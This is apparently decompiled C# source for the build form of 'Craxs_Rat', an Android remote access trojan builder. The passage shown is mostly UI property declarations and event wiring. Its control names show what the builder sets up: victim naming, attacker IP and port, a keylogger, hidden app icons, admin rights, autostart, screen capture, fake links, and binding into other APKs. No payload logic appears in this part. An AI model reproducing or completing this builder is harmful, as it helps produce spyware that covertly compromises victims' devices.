		set;
	}

	[field: AccessedThroughProperty("TabPage14")]
	internal virtual TabPage TabPage14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel8")]
	internal virtual Panel Panel8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label39")]
	internal virtual Label Label39
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckDraw")]
	internal virtual DrakeUICheckBox CheckDraw
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkemo")]
	internal virtual DrakeUICheckBox checkemo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckRecord")]
	internal virtual DrakeUICheckBox CheckRecord
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox Checksuper
	{
		[CompilerGenerated]
		get
		{
			return _Checksuper;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Checksuper_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _Checksuper;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_Checksuper = value;
			drakeUICheckBox = _Checksuper;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("checkkeyloger")]
	internal virtual DrakeUICheckBox checkkeyloger
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox CheckQuick
	{
		[CompilerGenerated]
		get
		{
			return _CheckQuick;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = CheckQuick_CheckedChanged;
			MouseEventHandler value3 = CheckQuick_CheckedChanged;
			DrakeUICheckBox drakeUICheckBox = _CheckQuick;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
				drakeUICheckBox.MouseClick -= value3;
			}
			_CheckQuick = value;
			drakeUICheckBox = _CheckQuick;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
				drakeUICheckBox.MouseClick += value3;
			}
		}
	}

	internal virtual DrakeUICheckBox CheckBIND
	{
		[CompilerGenerated]
		get
		{
			return _CheckBIND;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = CheckBIND_CheckedChanged_1;
			DrakeUICheckBox drakeUICheckBox = _CheckBIND;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_CheckBIND = value;
			drakeUICheckBox = _CheckBIND;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	internal virtual DrakeUICheckBox CheckIconPatch
	{
		[CompilerGenerated]
		get
		{
			return _CheckIconPatch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Toggle1_CheckedChanged;
			DrakeUICheckBox drakeUICheckBox = _CheckIconPatch;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_CheckIconPatch = value;
			drakeUICheckBox = _CheckIconPatch;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("CheckDoze")]
	internal virtual DrakeUICheckBox CheckDoze
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckHide")]
	internal virtual DrakeUICheckBox CheckHide
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("MainText")]
	internal virtual Label MainText
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label43
	{
		[CompilerGenerated]
		get
		{
			return _Label43;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label43_MouseEnter;
			EventHandler value3 = Label43_MouseLeave;
			Label label = _Label43;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label43 = value;
			label = _Label43;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	internal virtual TextBox delayaccesstext
	{
		[CompilerGenerated]
		get
		{
			return _delayaccesstext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Delayaccesstext_TextChanged;
			TextBox textBox = _delayaccesstext;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
			}
			_delayaccesstext = value;
			textBox = _delayaccesstext;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("delaylabelaccess")]
	internal virtual Label delaylabelaccess
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkautostart")]
	internal virtual DrakeUICheckBox checkautostart
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label34
	{
		[CompilerGenerated]
		get
		{
			return _Label34;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label34_MouseEnter;
			EventHandler value3 = Label34_MouseLeave;
			Label label = _Label34;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label34 = value;
			label = _Label34;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("checkadmin")]
	internal virtual DrakeUICheckBox checkadmin
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkprotector")]
	internal virtual DrakeUICheckBox checkprotector
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckHidePrims")]
	internal virtual DrakeUICheckBox CheckHidePrims
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label38
	{
		[CompilerGenerated]
		get
		{
			return _Label38;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label38_MouseEnter;
			EventHandler value3 = Label38_MouseLeave;
			Label label = _Label38;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label38 = value;
			label = _Label38;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("checkkeepsscreen")]
	internal virtual DrakeUICheckBox checkkeepsscreen
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("logbtntext")]
	internal virtual DrakeUITextBox logbtntext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label41
	{
		[CompilerGenerated]
		get
		{
			return _Label41;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label41_MouseEnter;
			EventHandler value3 = Label41_MouseLeave;
			Label label = _Label41;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label41 = value;
			label = _Label41;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("trgtbkg")]
	internal virtual DrakeUITextBox trgtbkg
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("bndbtntext")]
	internal virtual DrakeUITextBox bndbtntext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("bindbodytext")]
	internal virtual TextBox bindbodytext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cusomupdateimg")]
	internal virtual PictureBox cusomupdateimg
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label10
	{
		[CompilerGenerated]
		get
		{
			return _Label10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label10_MouseEnter;
			EventHandler value3 = Label10_MouseLeave;
			Label label = _Label10;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label10 = value;
			label = _Label10;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("CheckSkipre")]
	internal virtual DrakeUICheckBox CheckSkipre
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("bindCtitle")]
	internal virtual TextBox bindCtitle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextNameVictim")]
	internal virtual DrakeUITextBox TextNameVictim
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextNamePatch")]
	internal virtual DrakeUITextBox TextNamePatch
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("po")]
	internal virtual DrakeUITextBox po
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextIP")]
	internal virtual DrakeUITextBox TextIP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox TextPackage
	{
		[CompilerGenerated]
		get
		{
			return _TextPackage;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TextPackage_TextChanged_1;
			KeyEventHandler value3 = TextPackage_KeyDown;
			KeyPressEventHandler value4 = TextPackage_KeyPress;
			DrakeUITextBox drakeUITextBox = _TextPackage;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
				drakeUITextBox.KeyDown -= value3;
				drakeUITextBox.KeyPress -= value4;
			}
			_TextPackage = value;
			drakeUITextBox = _TextPackage;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
				drakeUITextBox.KeyDown += value3;
				drakeUITextBox.KeyPress += value4;
			}
		}
	}

	internal virtual DrakeUIAvatar randomidbtn
	{
		[CompilerGenerated]
		get
		{
			return _randomidbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Randomidbtn_Click;
			DrakeUIAvatar drakeUIAvatar = _randomidbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_randomidbtn = value;
			drakeUIAvatar = _randomidbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar randomverbtn
	{
		[CompilerGenerated]
		get
		{
			return _randomverbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Randomverbtn_Click;
			DrakeUIAvatar drakeUIAvatar = _randomverbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_randomverbtn = value;
			drakeUIAvatar = _randomverbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("TextVersion")]
	internal virtual DrakeUITextBox TextVersion
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("explainoptionstext")]
	internal virtual TextBox explainoptionstext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Textfakelink")]
	internal virtual DrakeUITextBox Textfakelink
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Textfakename")]
	internal virtual DrakeUITextBox Textfakename
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label13
	{
		[CompilerGenerated]
		get
		{
			return _Label13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label13_MouseEnter;
			EventHandler value3 = Label13_MouseLeave;
			Label label = _Label13;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label13 = value;
			label = _Label13;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox CheckAllPrims
	{
		[CompilerGenerated]
		get
		{
			return _CheckAllPrims;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = CheckAllPrims_CheckedChanged;
			MouseEventHandler value3 = CheckAllPrims_CheckedChanged;
			DrakeUICheckBox drakeUICheckBox = _CheckAllPrims;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
				drakeUICheckBox.MouseClick -= value3;
			}
			_CheckAllPrims = value;
			drakeUICheckBox = _CheckAllPrims;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
				drakeUICheckBox.MouseClick += value3;
			}
		}
	}

	[field: AccessedThroughProperty("comboproms")]
	internal virtual DrakeUIComboBox comboproms
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Primslist")]
	internal virtual DrakeUIListBox Primslist
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _Button1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_Button1 = value;
			drakeUIButtonIcon = _Button1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon SelectedApk
	{
		[CompilerGenerated]
		get
		{
			return _SelectedApk;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SelectedApk_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _SelectedApk;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_SelectedApk = value;
			drakeUIButtonIcon = _SelectedApk;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar addactiv
	{
		[CompilerGenerated]
		get
		{
			return _addactiv;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Addactiv_Click_1;
			DrakeUIAvatar drakeUIAvatar = _addactiv;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_addactiv = value;
			drakeUIAvatar = _addactiv;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar removeactiv
	{
		[CompilerGenerated]
		get
		{
			return _removeactiv;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Removeactiv_Click_1;
			DrakeUIAvatar drakeUIAvatar = _removeactiv;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_removeactiv = value;
			drakeUIAvatar = _removeactiv;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("panelmonitorb")]
	internal virtual Panel panelmonitorb
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("panemnitor")]
	internal virtual Panel panemnitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar removmonitor
	{
		[CompilerGenerated]
		get
		{
			return _removmonitor;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Removmonitor_Click;
			DrakeUIAvatar drakeUIAvatar = _removmonitor;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_removmonitor = value;
			drakeUIAvatar = _removmonitor;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar addmintor
	{
		[CompilerGenerated]
		get
		{
			return _addmintor;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Addmintor_Click;
			DrakeUIAvatar drakeUIAvatar = _addmintor;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_addmintor = value;
			drakeUIAvatar = _addmintor;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("listmonitor")]
	internal virtual DrakeUIListBox listmonitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("namemonitor")]
	internal virtual DrakeUITextBox namemonitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("idmonitor")]
	internal virtual DrakeUITextBox idmonitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("linkmonitor")]
	internal virtual DrakeUITextBox linkmonitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel10")]
	internal virtual Panel Panel10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkcaptureonce")]
	internal virtual DrakeUICheckBox checkcaptureonce
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox checkcatpure
	{
		[CompilerGenerated]
		get
		{
			return _checkcatpure;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Checkcatpure_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _checkcatpure;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_checkcatpure = value;
			drakeUICheckBox = _checkcatpure;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label44")]
	internal virtual Label Label44
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label42")]
	internal virtual Label Label42
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label40
	{
		[CompilerGenerated]
		get
		{
			return _Label40;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label40_MouseEnter;
			EventHandler value3 = Label40_MouseLeave;
			Label label = _Label40;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label40 = value;
			label = _Label40;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	internal virtual Label Label36
	{
		[CompilerGenerated]
		get
		{
			return _Label36;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label36_MouseEnter;
			EventHandler value3 = Label36_MouseLeave;
			Label label = _Label36;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label36 = value;
			label = _Label36;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	internal virtual Label Label26
	{
		[CompilerGenerated]
		get
		{
			return _Label26;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label26_MouseEnter;
			EventHandler value3 = Label26_MouseLeave;
			Label label = _Label26;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label26 = value;
			label = _Label26;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	internal virtual Label Label18
	{
		[CompilerGenerated]
		get
		{
			return _Label18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label18_MouseEnter;
			EventHandler value3 = Label18_MouseLeave;
			Label label = _Label18;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label18 = value;
			label = _Label18;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	internal virtual Label Label15
	{
		[CompilerGenerated]
		get
		{
			return _Label15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label15_MouseEnter;
			EventHandler value3 = Label15_MouseLeave;
			Label label = _Label15;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label15 = value;
			label = _Label15;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("explainmonitortext")]
	internal virtual TextBox explainmonitortext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label47")]
	internal virtual Label Label47
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label46")]
	internal virtual Label Label46
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label45")]
	internal virtual Label Label45
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label48")]
	internal virtual Label Label48
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checksignver")]
	internal virtual DrakeUIComboBox checksignver
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label49
	{
		[CompilerGenerated]
		get
		{
			return _Label49;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label49_MouseEnter;
			EventHandler value3 = Label49_MouseLeave;
			Label label = _Label49;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label49 = value;
			label = _Label49;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("checknetwork")]
	internal virtual DrakeUICheckBox checknetwork
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox clonecheck
	{
		[CompilerGenerated]
		get
		{
			return _clonecheck;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Clonecheck_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _clonecheck;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_clonecheck = value;
			drakeUICheckBox = _clonecheck;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel9")]
	internal virtual Panel Panel9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tracklist")]
	internal virtual DrakeUIListBox tracklist
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("trakertitle")]
	internal virtual Label trakertitle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar1_Click_1;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar1;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar1 = value;
			drakeUIAvatar = _DrakeUIAvatar1;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar2_Click_1;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar2;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar2 = value;
			drakeUIAvatar = _DrakeUIAvatar2;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("trackIDtext")]
	internal virtual DrakeUITextBox trackIDtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Generaltext")]
	internal virtual DrakeUITitleLine Generaltext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label50
	{
		[CompilerGenerated]
		get
		{
			return _Label50;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label50_MouseEnter;
			EventHandler value3 = Label50_MouseLeave;
			Label label = _Label50;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label50 = value;
			label = _Label50;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("checkunlocker")]
	internal virtual DrakeUICheckBox checkunlocker
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label11
	{
		[CompilerGenerated]
		get
		{
			return _Label11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label11_MouseEnter;
			EventHandler value3 = Label11_MouseLeave;
			Label label = _Label11;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label11 = value;
			label = _Label11;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("CheckAOX")]
	internal virtual DrakeUICheckBox CheckAOX
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public object ZipFile
	{
		[CompilerGenerated]
		get
		{
			return _ZipFile;
		}
		[CompilerGenerated]
		set
		{
			_ZipFile = RuntimeHelpers.GetObjectValue(value);
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Craxs_Rat.Build));
		this.box = new System.Windows.Forms.Panel();
		this.TABCTRL = new DrakeUI.Framework.DrakeUITabControl();
		this.TabPage10 = new System.Windows.Forms.TabPage();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.clonecheck = new DrakeUI.Framework.DrakeUICheckBox();
		this.TextVersion = new DrakeUI.Framework.DrakeUITextBox();
		this.randomverbtn = new DrakeUI.Framework.DrakeUIAvatar();
		this.randomidbtn = new DrakeUI.Framework.DrakeUIAvatar();
		this.TextPackage = new DrakeUI.Framework.DrakeUITextBox();
		this.TextNameVictim = new DrakeUI.Framework.DrakeUITextBox();
		this.TextNamePatch = new DrakeUI.Framework.DrakeUITextBox();
		this.po = new DrakeUI.Framework.DrakeUITextBox();
		this.TextIP = new DrakeUI.Framework.DrakeUITextBox();
		this.Label1 = new System.Windows.Forms.Label();
		this.MainText = new System.Windows.Forms.Label();
		this.CheckHide = new DrakeUI.Framework.DrakeUICheckBox();
		this.CheckIconPatch = new DrakeUI.Framework.DrakeUICheckBox();
		this.Label4 = new System.Windows.Forms.Label();
		this.Label9 = new System.Windows.Forms.Label();
		this.Label3 = new System.Windows.Forms.Label();
		this.Label2 = new System.Windows.Forms.Label();
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.TabPage9 = new System.Windows.Forms.TabPage();
